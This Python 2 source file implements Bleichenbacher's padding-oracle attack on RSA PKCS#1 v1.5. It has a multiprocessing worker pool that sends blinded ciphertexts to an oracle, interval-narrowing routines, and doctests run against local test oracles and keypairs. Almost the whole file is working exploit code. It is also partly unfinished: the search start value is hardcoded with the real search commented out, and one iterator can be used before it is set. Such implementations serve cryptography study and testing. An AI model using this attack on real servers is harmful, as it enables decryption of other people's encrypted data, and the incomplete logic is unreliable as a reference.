from __future__ import with_statement
import logging as log
import multiprocessing as mp
import threading as th
from oracle import Oracle, ExecOracle
from Crypto.PublicKey import RSA
from utils import NumUtils

import time

class RSAOracleWorker(mp.Process):

  def __init__(self, oracle, callback, tasks_queue, results_queue, *args, **kwargs):
    mp.Process.__init__(self)
    if tasks_queue == None or results_queue == None:
      raise ValueError("Task or result queue cannot be None")
    self.tasks_queue = tasks_queue
    self.results_queue = results_queue
    self.oracle = oracle
    self.callback = callback
    self.n = args[0]
    self.e = args[1]

  class RSATask(object):

    def __init__(self, task):
      """ Parses an incoming task into an RSATask
      Task must be a tuple containing (task_id, c, s, i)
      >>> task = (1,2,3)
      >>> rsa_task = RSAOracleWorker.RSATask(task)
      Traceback (most recent call last):
      ValueError: Task must contain 4 fields
      >>> task = (1, "123456789a", 1234, 8)
      >>> rsa_task = RSAOracleWorker.RSATask(task)
      >>> rsa_task.task_id
      1
      >>> rsa_task.c == 0x123456789a
      True
      >>> rsa_task.s
      1234
      >>> rsa_task.i
      8
      """
      if len(task) != 4:
        raise ValueError("Task must contain 4 fields")
      self.task_id = task[0]
      self.c = NumUtils.to_int_error(task[1], "Ciphertext")
      self.s = task[2]
      self.i = task[3]

  def __parse_task(self, task):
    """ Returns a task as an RSATask object
    >>> o = Oracle()
    >>> def callback():
    ...   return True
    >>> inq, outq = mp.Queue(), mp.Queue()
    >>> worker = RSAOracleWorker(o, callback, inq, outq, 123456, 0x10001)
    >>> worker._RSAOracleWorker__parse_task((1,2,3,4,5)) == None
    True
    >>> worker._RSAOracleWorker__parse_task((1,2,3,4)) # doctest: +ELLIPSIS
    <__main__.RSATask object ...
    """
    try:
      new_task = RSAOracleWorker.RSATask(task)
    except ValueError:
      new_task = None
    return new_task
  
  def run(self):
    """
    >>> o = ExecOracle("./pkcs1_test_oracle.py", ["args", "%0256x"])
    >>> def callback(stdout, stderr, rc):
    ...   return True
    >>> inq, outq = mp.Queue(), mp.Queue()
    >>> worker = RSAOracleWorker(o, callback, inq, outq, 123456, 0x10001)
    >>> worker.start()
    >>> inq.put((123, 1, 2, 3))
    >>> outq.get()
    (123, True, 2, 3)
    >>> inq.put((1, 2, 3))
    >>> inq.put((124, 5, 6, 7))
    >>> outq.get()
    (124, True, 6, 7)
    >>> inq.put((None))
    >>> worker.join()
    >>> worker.is_alive()
    False
    """
    while True:
      task = self.tasks_queue.get()
      if task == (None):
        break
      else:
        rsa_task = self.__parse_task(task)
        if rsa_task != None:
          c_prime = (rsa_task.c * (rsa_task.s**self.e)) % self.n
          oracle_result = self.oracle.query(c_prime, self.callback)
          if oracle_result == True:
            result = (rsa_task.task_id, oracle_result, rsa_task.s, rsa_task.i)
            self.results_queue.put(result)

class Bleichenbacher(object):

  __POISON_PILL = (None)

  def __init__(self, n, oracle, callback, e=0x10001, pool_size=mp.cpu_count()):
    """Builds an object to compute the Bleichenbacher attack
    >>> def callback():
    ...   pass
    >>> b = Bleichenbacher(1234123412341234, None, callback)
    Traceback (most recent call last):
    ValueError: Padding oracle must extend the Oracle base class
    >>> o = Oracle()
    >>> b = Bleichenbacher(1234123412341234, o, None)
    Traceback (most recent call last):
    ValueError: Callback must be a function evaluating oracle output
    >>> b = Bleichenbacher(1234123412341234, o, callback)
    >>> b.n
    1234123412341234
    >>> b.k
    64
    >>> hex(b.B2)[:3] == "0x2"
    True
    >>> hex(b.B3 - 1)[:5] == "0x2ff"
    True
    """
    self.n = NumUtils.to_int_error(n, "Modulus")
    bits_needed = NumUtils.bytes_to_hold(self.n) * 8
    self.k = NumUtils.pow2_round(bits_needed)
    self.e = NumUtils.to_int_error(e, "Exponent")
    self.B = 2**(self.k - 16)
    self.B2 = 2*self.B
    self.B3 = 3*self.B
    self.M0 = set([(self.B2, self.B3 - 1)])
    self.s_min_start = NumUtils.ceil_int(n, self.B3)
    self.s1_search_running = False
    self.found_solution = False
    if isinstance(oracle, Oracle):
      self.oracle = oracle
    else:
      raise ValueError("Padding oracle must extend the Oracle base class")
    if callable(callback):
      self.callback = callback
    else:
      raise ValueError("Callback must be a function evaluating oracle output") 
    self.__task_id = 0
    self.__worker_pool_running = False
    self.__worker_pool_init(pool_size)
    self.__worker_pool_start()
    self.__result_worker = th.Thread(target=self.__get_task_results)
    self.__result_worker.start()
    #log.basicConfig(level=log.DEBUG)
    #self.logger = log.getLogger(__name__)

  @classmethod
  def pubkey_from_file(cls, key_file, oracle, callback):
    """Imports modulus and exponent information from a pem key file
    >>> def callback():
    ...   pass
    >>> o = Oracle()
    >>> b = Bleichenbacher.pubkey_from_file("keypairs/256.pub", o, callback)
    >>> b.n
    93363501535823485560286011140434660057766656356767952260224292233143073609873L
    >>> b.k
    256
    """
    with open(key_file, 'r') as kf:
      key_pair = RSA.importKey(kf.read())
    b = cls(key_pair.n, oracle, callback, key_pair.e)
    return b

  def __worker_pool_init(self, pool_size, task_queue_size=100, result_queue_size=1):
    self.__task_queue = mp.Queue(task_queue_size)
    self.__result_queue = mp.Queue(result_queue_size)
    self.worker_pool = [RSAOracleWorker(self.oracle, self.callback, self.__task_queue, self.__result_queue, self.n, self.e)
                        for _ in xrange(pool_size)]

  def __worker_pool_start(self):
    for p in self.worker_pool:
      p.start()
    self.__worker_pool_running = True

  def __worker_pool_stop(self):
    for p in self.worker_pool:
      self.__task_queue.put(Bleichenbacher.__POISON_PILL)
      p.join()
    self.__worker_pool_running = False

  def __result_thread_stop(self):
    self.__result_queue.put(Bleichenbacher.__POISON_PILL)
    self.__result_worker.join()

  def __submit_pool_task(self, task):
    self.__task_queue.put(task)

  def __narrow_interval(self, s, M):
    R = self.__get_r_values(s, M)
    M = self.__get_search_intervals(R, s, M)
    return M

  def stop_search(self):
    self.__worker_pool_stop()
    self.__result_thread_stop()

  def run_search(self, c):
    M = self.M0
    s_min = self.s_min_start
    s_max = None
    
    s_min, i = 42298, 1
    #s_min, i = self.s_search(c, s_min, s_max)

    while not self.found_solution:
      a = list(M)[0][0]
      b = list(M)[0][1]
      if len(M) != 1:
        M = self.__narrow_interval(s_min, M)
        s_min, i = self.s_search(c, s_min, s_max)
      else:
        if a == b:
          self.found_solution = True
          print("Got solution: %0256x" % a)
        else:
          if s_min != None:
            M = self.__narrow_interval(s_min, M)
            it = self.__converge_s_interval(s_min, M)
          (s_min, s_max) = it.next()
          s_min, i = self.s_search(c, s_min, s_max)
          print(s_min, M,  b - a)
          
  def __get_task_results(self):
    res = []
    while True:
      result = self.__result_queue.get()
      res.append(result)
      print("Result for task: ", result)
      print("During task: %i" % self.__task_id)
      if result == Bleichenbacher.__POISON_PILL:
        break
      self.__s = result[2] 
      self.__i = result[3]
      self.s_search_running = False

  def s_search(self, c, s_min, s_max=None):
    """
    >>> def callback(stdout, stderr, rc):
    ...   return True if rc != 2 else False
    >>> o = ExecOracle("./pkcs1_test_oracle.py", ["keypairs/1024.priv", "%0256x"])
    >>> b = Bleichenbacher.pubkey_from_file("keypairs/1024.pub", o, callback)
    >>> b.s_search("1234abcdh", 0)
    Traceback (most recent call last):
    ValueError: Ciphertext must be an integer
    >>> # ./rsa_test_client.py 1024.pub $(python -c 'print "000201020304050607080900" + "41"*116')
    >>> b.s_search("6c1d38dbcb5c0ab72324618ce93f646c842aa7029920722c14570a0d856219f778620850c57c69dc0e41923c8696d8494c846f8f2bf4f0e8d5ce4c865c624f438a70f927b77aa72628fd05bd5d7853d0d859f27b95428c9d6d16fab1ef46509051fdceb97ee0f8192e91115bc29a703278b7a95a22b90ecd5c8015d019e35b8e", b.s_min_start) # doctest: +SKIP
    (42298L, 28172)
    """
    c = NumUtils.to_int_error(c, "Ciphertext")
    s = s_min
    i = 1

    self.s_search_running = True
    self.__task_id += 1
    self.__s = None
    self.__i = None
    while self.s_search_running:
      # Multiprocessor searching can be done when there is no upper boundary
      if s_max == None:
        self.__submit_pool_task((self.__task_id, c, s, i))
      # Otherwise fallback to linear searching
      # TODO: Improve by rescaling the pool
      else:
        if s > s_max:
          self.s_search_running = False
        else: 
          c_prime = (c * (s**self.e)) % self.n
          if self.oracle.query(c_prime, self.callback):
            self.__s = s
            self.__i = i
            self.s_search_running = False
      i += 1
      s += 1
    return self.__s, self.__i

  def __get_r_values(self, s, intervals):
    """returns the values of r for a given s/interval couple
    >>> def callback():
    ...   pass
    >>> o = ExecOracle("./pkcs1_test_oracle.py", ["keypairs/1024.priv", "%0256x"])
    >>> b = Bleichenbacher.pubkey_from_file("keypairs/1024.pub", o, callback)
    >>> # Calling private method through name mangling. Not sure how to test with doctest otherwise
    >>> b._Bleichenbacher__get_r_values(42298L, set([(1, 2, 3)]))
    Traceback (most recent call last):
    ValueError: An interval must contain 2 values only
    >>> b._Bleichenbacher__get_r_values(42298L, set([(2, 1)]))
    Traceback (most recent call last):
    ValueError: The interval upper boundary must be superior to the lower boundary
    >>> b._Bleichenbacher__get_r_values(42298L, set([(b.B2, b.B3 - 1)]))
    [2]
    """
    R = []
    for interval in intervals:
      if len(interval) != 2:
        raise ValueError("An interval must contain 2 values only")
      a = interval[0]
      b = interval[1]
      if (a > b):
        raise ValueError("The interval upper boundary must be superior to the lower boundary")
      r_min = NumUtils.ceil_int((a * s - self.B3 + 1), self.n)
      r_max = NumUtils.floor_int((b * s - self.B2), self.n)
      R.extend([r for r in range(r_min, r_max + 1)])
    return R

  def __get_search_intervals(self, R, s, M):
    """
    >>> def callback():
    ...   pass
    >>> o = ExecOracle("./pkcs1_test_oracle.py", ["keypairs/1024.priv", "%0256x"])
    >>> b = Bleichenbacher.pubkey_from_file("keypairs/1024.pub", o, callback)
    >>> M = b._Bleichenbacher__get_search_intervals([2, 3], 42298L, set([(b.B2, b.B3 - 1), (b.B2, b.B3 - 1)]))
    >>> M
    set([(5496887481649310677312273406003793183582777148242941892439949450277737071001138376320592327946554069347948926815933108973166742899056823715751318121381743085331656870604607768325297130993447946417262236480484519794268058017772040064446757490222074521854458697349586588761691894067915139519429990011640015L, 5496952332517777196872101955063455427770091848614542586705282468410845683670552529152252987737791673523011734569554295224428563294629460065553947372217695679665899795786657865330646504370413665056732678493596987993653272377244460842840420225558265257305452366702707014190670121644559497925100005725173178L)])
    >>> print("%0256x" % list(M)[0][0])
    000201012793fa30b688fb61e3fb077f95292e18c6fbd530b5ae1ed552e9091206fd2dbddccd9299c7d28884ec3d6877cbb4add7e4bf91a656934cfda649e641e02c94b3eda5bf28ad9265036a1d5f01894b244dc4d96cbebec0bed9209feacdbffe812db5eaa25c708a58fd656c79b26bbc86a87f62d11e9d2ac541948018cf
    """
    new_M = set([])
    for (a, b) in M:
      for r in R:
        new_a = max(a, NumUtils.ceil_int(self.B2 + r * self.n, s))
        new_b = min(b, NumUtils.floor_int(self.B3 - 1 + r * self.n, s))
        if new_a <= new_b and (new_a, new_b) not in new_M:
            new_M |= set([(new_a, new_b)])
    return new_M

  def __converge_s_interval(self, s, M):
    """Once a single interval remains, converge towards the final value of a.
    >>> def callback():
    ...   pass
    >>> o = ExecOracle("./pkcs1_test_oracle.py", ["keypairs/1024.priv", "%0256x"])
    >>> b = Bleichenbacher.pubkey_from_file("keypairs/1024.pub", o, callback)
    >>> M = set([(5496887481649310677312273406003793183582777148242941892439949450277737071001138376320592327946554069347948926815933108973166742899056823715751318121381743085331656870604607768325297130993447946417262236480484519794268058017772040064446757490222074521854458697349586588761691894067915139519429990011640015L, 5496952332517777196872101955063455427770091848614542586705282468410845683670552529152252987737791673523011734569554295224428563294629460065553947372217695679665899795786657865330646504370413665056732678493596987993653272377244460842840420225558265257305452366702707014190670121644559497925100005725173178L)])
    >>> s = 42298
    >>> it = b._Bleichenbacher__converge_s_interval(s, M)
    >>> it.next()
    (84595L, 84595L)
    >>> it.next()
    (105743L, 105744L)
    """
    if len(M) != 1:
      raise ValueError("M must contain only one interval")
    a = list(M)[0][0]
    b = list(M)[0][1]
    # Used to be ceil
    r = NumUtils.floor_int(2 * (b * s - self.B2), self.n)
    while True:
      # Used to be ceil
      s_min = NumUtils.ceil_int(self.B2 + r * self.n, b)
      s_max = NumUtils.floor_int(self.B3 + r * self.n, a)
      r += 1
      yield (s_min, s_max)

if __name__ == "__main__":
  import doctest
  #doctest.testmod()
